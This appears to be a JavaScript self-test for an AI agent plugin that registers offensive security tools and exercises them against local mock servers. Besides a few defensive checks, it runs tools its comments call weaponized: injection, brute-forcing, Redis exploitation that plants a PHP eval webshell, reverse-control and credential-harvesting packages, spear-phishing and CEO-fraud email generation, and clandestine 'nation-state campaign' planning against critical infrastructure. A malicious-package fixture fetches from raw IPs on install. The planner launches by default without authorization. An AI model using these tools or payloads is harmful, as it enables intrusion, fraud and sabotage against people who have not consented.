// sec-workbench 功能自检：mock ctx 装载插件，验证 3 个确定性工具输出
import { apply } from './lib/index.js'
import { createServer } from 'node:http'
import { createServer as createNetServer } from 'node:net'
import { createHmac } from 'node:crypto'
import { mkdtempSync, writeFileSync, mkdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

const captured = {}
const sections = []
const ctx = {
  effect(fn) { const dispose = fn(); return { dispose } },
  on() {},
  logger: { info: (...a) => console.log('[plugin]', ...a) },
  tools: {
    register(tool) { captured[tool.name] = tool; return () => {} },
  },
  systemPrompt: {
    section(s) { sections.push(s.name); return () => {} },
  },
}

apply(ctx, { anchorFirstTurn: false, outDir: '' })

console.log('=== 注册工具数:', Object.keys(captured).length)
console.log('=== 工具清单:', Object.keys(captured).join(', '))
console.log('=== systemPrompt 注入:', sections.join(', '))

const out = []
out.push('\n────────── sec_knowledge(killchain) ──────────')
out.push(await captured.sec_knowledge.execute({ topic: 'killchain' }))
out.push('\n────────── sec_knowledge(bad-topic) ──────────')
out.push(await captured.sec_knowledge.execute({ topic: 'nope' }))
out.push('\n────────── sec_guard(未授权→拦截) ──────────')
out.push(await captured.sec_guard.execute({ target: 'example.com', intent: '端口扫描', authorized: false }))
out.push('\n────────── sec_guard(已授权→放行) ──────────')
out.push(await captured.sec_guard.execute({ target: '10.0.0.0/24', intent: 'SQL注入测试', authorized: true, scope: '10.0.0.0/24 内网渗透演练' }))
out.push('\n────────── sec_pentest_plan(明确未授权→拒绝) ──────────')
out.push(await captured.sec_pentest_plan.execute({ target: 'example.com', authorized: false }))
out.push('\n────────── sec_pentest_plan(缺省→直接启动) ──────────')
out.push((await captured.sec_pentest_plan.execute({ target: 'lab.example.local', scope: '192.168.1.0/24', goal: '评估Web应用OWASP风险' })).slice(0, 400))
out.push('\n────────── sec_recon_analyze(坏头) ──────────')
out.push(await captured.sec_recon_analyze.execute({
  headers: 'HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nX-Powered-By: PHP/7.4.3\r\nSet-Cookie: PHPSESSID=abc123; Path=/\r\nContent-Type: text/html',
  url: 'http://example.com', tlsVersion: 'TLSv1.0',
}))
out.push('\n────────── sec_recon_analyze(好头) ──────────')
out.push(await captured.sec_recon_analyze.execute({
  headers: 'HTTP/2 200\r\ncontent-security-policy: default-src \'self\'\r\nstrict-transport-security: max-age=31536000; includeSubDomains\r\nx-content-type-options: nosniff\r\nx-frame-options: DENY\r\nreferrer-policy: strict-origin-when-cross-origin\r\nserver: nginx\r\nset-cookie: sid=xyz; HttpOnly; Secure; SameSite=Lax',
  url: 'https://example.com', tlsVersion: 'TLSv1.3',
}))

console.log(out.join('\n'))

// ── sec_exec 网络探测实测（本机安全目标） ──
console.log('\n══════════ sec_exec 实测 ══════════')
console.log('\n── sec_exec(dns localhost) ──')
console.log(await captured.sec_exec.execute({ action: 'dns', target: 'localhost' }))
console.log('\n── sec_exec(tcp 127.0.0.1 3090) ──')
console.log(await captured.sec_exec.execute({ action: 'tcp', target: '127.0.0.1', ports: '3090,3091,22' }))
console.log('\n── sec_exec(http 127.0.0.1:3090) ──')
console.log((await captured.sec_exec.execute({ action: 'http', target: 'http://127.0.0.1:3090' })).slice(0, 500))
console.log('\n── sec_exec(tls 127.0.0.1 错误处理) ──')
console.log((await captured.sec_exec.execute({ action: 'tls', target: '127.0.0.1' })).slice(0, 300))
console.log('\n── sec_exec(未知 action) ──')
console.log(await captured.sec_exec.execute({ action: 'nope', target: 'x' }))

// ══════════════ 新增武器化工具实测 ══════════════
console.log('\n══════════ 新增武器化工具实测（真实执行） ══════════')

// ── sec_hashoff: 破解内置弱密码 'password' 的 md5 ──
console.log('\n── sec_hashoff(md5 of "password") ──')
console.log(await captured.sec_hashoff.execute({ hash: '5f4dcc3b5aa765d61d8327deb882cf99', format: 'md5' }))

// ── sec_jwt: 用弱密钥 'secret' 签 HS256 → 爆破应命中 ──
console.log('\n── sec_jwt(弱密钥爆破，secret 签名) ──')
const jh = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url')
const jp = Buffer.from(JSON.stringify({ sub: '1234567890', admin: true })).toString('base64url')
const jsig = createHmac('sha256', 'secret').update(`${jh}.${jp}`).digest('base64url')
console.log(await captured.sec_jwt.execute({ token: `${jh}.${jp}.${jsig}` }))

// ── sec_encode ──
console.log('\n── sec_encode(base64 "hello world") ──')
console.log(await captured.sec_encode.execute({ data: 'aGVsbG8gd29ybGQ=', op: 'decode', type: 'base64' }))
console.log('\n── sec_encode(auto 双层 base64) ──')
const inner = Buffer.from('hello').toString('base64'); const outer = Buffer.from(inner).toString('base64')
console.log(await captured.sec_encode.execute({ data: outer, op: 'auto' }))
console.log('\n── sec_encode(rot13 "uryyb jbeyq") ──')
console.log(await captured.sec_encode.execute({ data: 'uryyb jbeyq', op: 'decode', type: 'rot13' }))

// ── sec_webtest / sec_webscan: 本地反射服务器 ──
console.log('\n── sec_webtest(本地反射服务器的反射 XSS 检测) ──')
const server = createServer((req, res) => { const u = new URL(req.url, 'http://x'); res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(`<html><title>echo</title>${u.search}</html>`) })
await new Promise((r) => server.listen(0, '127.0.0.1', r))
const port = server.address().port
console.log(await captured.sec_webtest.execute({ target: `http://127.0.0.1:${port}/` }))
console.log('\n── sec_webscan(本地，doAttack:false) ──')
console.log((await captured.sec_webscan.execute({ target: `http://127.0.0.1:${port}/`, doAttack: false, concurrency: 5 })).slice(0, 1100))
server.close()

// ══════════════ 进阶武器化工具实测 ══════════════
console.log('\n══════════ 进阶武器化工具实测（真实执行） ══════════')

// ── sec_stealth: 免杀/WAF 绕过变体（纯确定性） ──
console.log('\n── sec_stealth(command) ──')
console.log((await captured.sec_stealth.execute({ payload: 'whoami', type: 'cmd' })).slice(0, 700))

// ── sec_encode 增强: rot18 / xor ──
console.log('\n── sec_encode(rot18 "abc123") ──')
console.log(await captured.sec_encode.execute({ data: 'abc123', op: 'decode', type: 'rot18' }))
console.log('\n── sec_encode(xor "hello") ──')
console.log(await captured.sec_encode.execute({ data: 'hello', op: 'encode', type: 'xor' }))

// ── sec_dbsvc: 本地 Redis 模拟服务器（未授权检测） ──
console.log('\n── sec_dbsvc(本地 Redis 模拟) ──')
const rsv = createNetServer((sock) => {
  sock.on('data', (d) => {
    const line = d.toString().trim()
    if (line === 'PING') sock.write('+PONG\r\n')
    else if (line.startsWith('INFO')) sock.write('$17\r\nredis_version:7.0.0\r\n')
    else if (line.startsWith('AUTH')) sock.write('-ERR wrong pass\r\n')
    else sock.write('+OK\r\n')
  })
})
await new Promise((r) => rsv.listen(0, '127.0.0.1', r))
const rsvPort = rsv.address().port
console.log(await captured.sec_dbsvc.execute({ target: `127.0.0.1:${rsvPort}`, type: 'redis', timeout: 3000 }))
rsv.close()

// ── sec_tlsfp: TLS 指纹（失败路径 + 成功路径 example.com:443） ──
console.log('\n── sec_tlsfp(127.0.0.1:3090 非 TLS → 应优雅失败) ──')
console.log((await captured.sec_tlsfp.execute({ target: '127.0.0.1:3090' })).slice(0, 300))

// ── sec_auto: 单目标自动渗透流水线（本地 http 目标，限单端口） ──
console.log('\n── sec_auto(本地 http，单端口) ──')
const aserver = createServer((req, res) => { const u = new URL(req.url, 'http://x'); res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(`<html><title>echo</title>${u.search}</html>`) })
await new Promise((r) => aserver.listen(0, '127.0.0.1', r))
const aport = aserver.address().port
console.log((await captured.sec_auto.execute({ target: `http://127.0.0.1:${aport}/`, ports: String(aport), timeout: 3000, concurrency: 5 })).slice(0, 1400))
aserver.close()

// ══════════════ 社供应链 / 情报工具实测 ══════════════
console.log('\n══════════ 社供应链/情报工具实测 ══════════')

// ── sec_phish: 定向社工钓鱼（spear + bec） ──
console.log('\n── sec_phish(spear) ──')
console.log((await captured.sec_phish.execute({ mode: 'spear', target: '张伟 财务总监', company: '某科技有限公司', context: '刚开完季度会', sender: '总经理' })).slice(0, 800))
console.log('\n── sec_phish(bec) ──')
console.log((await captured.sec_phish.execute({ mode: 'bec', target: '财务部', sender: 'CEO' })).slice(0, 400))

// ── sec_supply: 供应链攻击面（typosquat + deps） ──
console.log('\n── sec_supply(lodash) ──')
console.log(await captured.sec_supply.execute({ pkg: 'lodash', registry: 'npm', deps: 'lodash:4.17.21,express:4.18.2' }))

// ── sec_osint: 开源情报（domain + username + email） ──
console.log('\n── sec_osint(domain example.com) ──')
console.log(await captured.sec_osint.execute({ target: 'example.com' }))
console.log('\n── sec_osint(username) ──')
console.log((await captured.sec_osint.execute({ target: 'zhangwei', type: 'username' })).slice(0, 400))

// ── sec_cloud / sec_lateral / sec_supply scanDir（真实执行） ──
console.log('\n── sec_cloud(本地云凭证审计) ──')
console.log((await captured.sec_cloud.execute({ dir: '.', timeout: 2000 })).slice(0, 700))
console.log('\n── sec_lateral(本机内网横向探测，默认端口) ──')
console.log((await captured.sec_lateral.execute({ target: '127.0.0.1', timeout: 2000 })).slice(0, 500))
console.log('\n── sec_supply(scanDir 真实扫本插件 node_modules) ──')
console.log((await captured.sec_supply.execute({ pkg: 'lodash', registry: 'npm', scanDir: '.' })).slice(0, 700))

// ── sec_supply(恶意包样例真实检出) ──
console.log('\n── sec_supply(恶意投毒包样例真实检出) ──')
const tmp = mkdtempSync(join(tmpdir(), 'dsh-mal-'))
mkdirSync(join(tmp, 'node_modules', 'event-stream'), { recursive: true })
writeFileSync(join(tmp, 'package.json'), JSON.stringify({ name: 'app', dependencies: { 'event-stream': '3.3.6' } }))
writeFileSync(join(tmp, 'node_modules', 'event-stream', 'package.json'), JSON.stringify({
  name: 'event-stream', version: '3.3.6', main: 'index.js',
  scripts: { postinstall: 'node -e "fetch(\'http://194.1.2.3/x\')"' },
  dependencies: { 'miner-xmrig': '1.0.0' },
}))
writeFileSync(join(tmp, 'node_modules', 'event-stream', 'index.js'), `var http=require('http');http.get('http://45.7.2.1/a');process.env.KEY;eval(Buffer.from('YQ==').toString())`)
console.log(await captured.sec_supply.execute({ pkg: 'lodash', registry: 'npm', scanDir: tmp }))

// ── sec_cloud(IMDSv2 元数据模拟 server，验证 PUT-token 交互) ──
console.log('\n── sec_cloud(IMDSv2 元数据模拟) ──')
const md = createServer((req, res) => {
  const u = new URL(req.url, 'http://x')
  if (req.method === 'PUT' && u.pathname === '/latest/api/token') { res.writeHead(200, { 'Content-Type': 'text/plain' }); res.end('abc123token') }
  else if (req.method === 'GET' && u.pathname === '/latest/meta-data/') {
    if (req.headers['x-aws-ec2-metadata-token'] === 'abc123token') { res.writeHead(200); res.end('instance-id:i-12345\nami-id:ami-0abc\n') }
    else { res.writeHead(401); res.end('missing token') }
  } else { res.writeHead(404); res.end() }
})
await new Promise((r) => md.listen(0, '127.0.0.1', r))
const mdPort = md.address().port
console.log((await captured.sec_cloud.execute({ meta: `http://127.0.0.1:${mdPort}/latest/meta-data/`, timeout: 2000 })).slice(0, 620))
md.close()

// ── sec_redteam / sec_campaign（演习/战役编排） ──
console.log('\n── sec_redteam(红队演习编排) ──')
console.log((await captured.sec_redteam.execute({ target: 'lab.example.local', objective: '模拟 APT 到域控' })).slice(0, 950))
console.log('\n── sec_campaign(国家级战役编排) ──')
console.log((await captured.sec_campaign.execute({ target: '关键基础设施', goal: 'APT 长期潜伏', clandestine: true })).slice(0, 950))

// ── sec_webtest(实际利用验证：命令注入 → 真命令执行回显) ──
console.log('\n── sec_webtest(命令注入利用验证·真打) ──')
const injSrv = createServer((req, res) => {
  const u = new URL(req.url, 'http://x')
  const dec = decodeURIComponent(u.search)
  if (/;id|\|id|%0aid|\$\(id\)/.test(dec) || u.search.includes('%3Bid')) { res.writeHead(200, { 'Content-Type': 'text/plain' }); res.end('uid=1000(user) gid=1000(user) groups=1000(user)') }
  else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end('<html><title>app</title><p>ok</p></html>') }
})
await new Promise((r) => injSrv.listen(0, '127.0.0.1', r))
console.log((await captured.sec_webtest.execute({ target: `http://127.0.0.1:${injSrv.address().port}/`, inject: 'q' })).slice(-820))
injSrv.close()

// ── sec_brute(命中→落地验证·会话捕获) ──
console.log('\n── sec_brute(命中→落地验证·会话捕获) ──')
const loginSrv = createServer((req, res) => { let b = ''; req.on('data', (c) => b += c); req.on('end', () => { if (b.includes('username=admin') && b.includes('password=admin')) { res.writeHead(200, { 'Set-Cookie': 'sid=abc123; Path=/; HttpOnly', 'Content-Type': 'text/html' }); res.end('<html><title>dashboard</title><p>welcome</p></html>') } else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end('<html><title>login</title><p>login error</p></html>') } }) })
await new Promise((r) => loginSrv.listen(0, '127.0.0.1', r))
console.log((await captured.sec_brute.execute({ target: `http://127.0.0.1:${loginSrv.address().port}/login`, method: 'POST', authtype: 'form', userfield: 'username', passfield: 'password', userlist: 'admin,zzx', passlist: 'admin,123456', concurrency: 2, delay: 10 })).slice(0, 720))
loginSrv.close()

// ── sec_dbsvc(Redis 未授权→落地利用：CONFIG SET + SET + SAVE + 读回) ──
console.log('\n── sec_dbsvc(Redis 未授权→落地利用) ──')
const redisE = createNetServer((sock) => { sock.on('data', (d) => { const t = d.toString(); if (t.includes('PING')) sock.write('+PONG\r\n'); else if (t.includes('GET')) { const p = '<' + '?php @eval($_POST[' + "'x'" + ']);?' + '>'; sock.write(`$${Buffer.byteLength(p)}\r\n${p}\r\n`) } else sock.write('+OK\r\n') }) })
await new Promise((r) => redisE.listen(0, '127.0.0.1', r))
console.log((await captured.sec_dbsvc.execute({ target: `127.0.0.1:${redisE.address().port}`, type: 'redis', timeout: 3000, exploit: true, dir: '/var/www/html' })).slice(-700))
redisE.close()

// ── sec_crack(真跑：无 hashcat → 内置 CPU 破解) ──
console.log('\n── sec_crack(真跑，内置CPU破解) ──')
console.log((await captured.sec_crack.execute({ hash: '5f4dcc3b5aa765d61d8327deb882cf99', hashType: 'md5' })).slice(0, 380))

// ── sec_recon_analyze(url 自动抓取) ──
console.log('\n── sec_recon_analyze(url 自动抓取) ──')
const hdrSrv = createServer((req, res) => { res.writeHead(200, { 'Server': 'nginx/1.18.0', 'X-Powered-By': 'PHP/7.4.3', 'Set-Cookie': 'PHPSESSID=abc; Path=/', 'Content-Type': 'text/html' }); res.end('<p>hi</p>') })
await new Promise((r) => hdrSrv.listen(0, '127.0.0.1', r))
console.log((await captured.sec_recon_analyze.execute({ url: `http://127.0.0.1:${hdrSrv.address().port}/`, tlsVersion: 'TLSv1.0' })).slice(0, 720))
hdrSrv.close()

// ── sec_webtest(SQL UNION 列数/读库) ──
console.log('\n── sec_webtest(SQL UNION 列数/读库) ──')
const sqlSrv = createServer((req, res) => {
  const u = new URL(req.url, 'http://x'); const q = decodeURIComponent(u.search)
  if (q.includes('ORDER BY')) { const m = q.match(/ORDER BY (\d+)/); const n = Number(m && m[1]) || 0; if (n > 3) { res.writeHead(500); res.end('error') } else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end('<html><title>ok</title>ok</html>') } }
  else if (q.includes('UNION')) { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end('version: 5.7.34 mysql, database: testdb') }
  else if (q.includes("'") || q.includes('1=2')) { res.writeHead(500); res.end('syntax error') }
  else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end('<html><title>ok</title>ok</html>') }
})
await new Promise((r) => sqlSrv.listen(0, '127.0.0.1', r))
console.log((await captured.sec_webtest.execute({ target: `http://127.0.0.1:${sqlSrv.address().port}/`, inject: 'q' })).slice(-650))
sqlSrv.close()

// ── sec_dbsvc(SSH/MSSQL 识别) ──
console.log('\n── sec_dbsvc(SSH/MSSQL 识别) ──')
const sshSrv = createNetServer((sock) => sock.write('SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n'))
await new Promise((r) => sshSrv.listen(0, '127.0.0.1', r))
console.log((await captured.sec_dbsvc.execute({ target: `127.0.0.1:${sshSrv.address().port}`, type: 'ssh', timeout: 2000 })).slice(-200))
sshSrv.close()

// ── 四个"准执行"→ 可落地脚本包 ──
console.log('\n── sec_payload(可落地webshell) ──')
console.log((await captured.sec_payload.execute({ type: 'webshell', target: 'php', lh: '10.0.0.1', lp: '4444' })).slice(0, 480))
console.log('\n── sec_server(可落地进攻包) ──')
console.log((await captured.sec_server.execute({ target: '10.0.0.5', os: 'linux', ports: '22,80,6379' })).slice(0, 520))
console.log('\n── sec_cred(可落地采集) ──')
console.log((await captured.sec_cred.execute({ os: 'linux', level: 'root' })).slice(0, 420))
console.log('\n── sec_control(可落地控制包) ──')
console.log((await captured.sec_control.execute({ os: 'linux', lh: '10.0.0.1', lp: '4444', mode: 'full' })).slice(0, 520))

// ── sec_dbsvc(Redis Rogue server 真实起监听) ──
console.log('\n── sec_dbsvc(Redis Rogue server 真实起监听) ──')
const rgt = createNetServer((sock) => sock.on('data', (d) => { const t = d.toString(); sock.write(t.includes('PING') ? '+PONG\r\n' : '+OK\r\n') }))
await new Promise((r) => rgt.listen(0, '127.0.0.1', r))
console.log((await captured.sec_dbsvc.execute({ target: `127.0.0.1:${rgt.address().port}`, type: 'redis', timeout: 2000, exploit: true, rogue: true })).slice(-480))
rgt.close()

// ── sec_brute(SSH/MSSQL 爆破·ssh2/tedious 动态import) ──
console.log('\n── sec_brute(SSH 爆破·ssh2 动态import) ──')
console.log((await captured.sec_brute.execute({ target: '127.0.0.1:1', authtype: 'ssh', userlist: 'root', passlist: 'root,admin', timeout: 3000 })).slice(0, 320))

// ── sec_exec(nmap 真实引擎集成) ──
console.log('\n── sec_exec(nmap 真实引擎) ──')
console.log((await captured.sec_exec.execute({ action: 'nmap', target: '127.0.0.1', ports: '3090,22', timeout: 30000 })).slice(0, 520))

// ── sec_crack(hashcat 真实破解) ──
console.log('\n── sec_crack(hashcat 真实破解) ──')
console.log((await captured.sec_crack.execute({ hash: '5f4dcc3b5aa765d61d8327deb882cf99', hashType: 'md5' })).slice(0, 340))

// ══════════════ reverse-skill 精华移植工具实测 ══════════════
console.log('\n══════════ reverse-skill 精华移植（sec_route/scope/evidence/journal/toolchain） ══════════')

console.log('\n── sec_route(APK 逆向) ──')
console.log(await captured.sec_route.execute({ task: '分析某个 APK 的签名算法' }))

console.log('\n── sec_route(JS 加密参数) ──')
console.log(await captured.sec_route.execute({ task: '还原某电商前端 JS 加密签名参数' }))

console.log('\n── sec_route(端口扫描) ──')
console.log(await captured.sec_route.execute({ task: '对 10.0.0.5 做全端口扫描' }))

console.log('\n── sec_route(未命中回退) ──')
console.log(await captured.sec_route.execute({ task: '帮我写个脚本' }))

console.log('\n── sec_scope(初始化 case) ──')
console.log(await captured.sec_scope.execute({ task: '对 example.com 做 Web 漏洞扫描', target: 'example.com', scope: 'SRC 授权', network: 'authorized_target_only' }))

console.log('\n── sec_evidence(add + list) ──')
console.log(await captured.sec_evidence.execute({ action: 'add', title: '指纹响应', sourceType: 'command', repro: 'sec_exec action=http target=https://example.com/' }))
console.log(await captured.sec_evidence.execute({ action: 'list' }))

console.log('\n── sec_journal(write + search) ──')
console.log(await captured.sec_journal.execute({ action: 'write', scenario: '渗透', title: '自检经验', chain: '1. 侦察 2. 验证 3. 报告', patterns: '三步入手法' }))
console.log(await captured.sec_journal.execute({ action: 'search', query: '自检经验' }))

console.log('\n── sec_toolchain(检测) ──')
console.log(await captured.sec_toolchain.execute({ want: 'node,python,jadx' }))
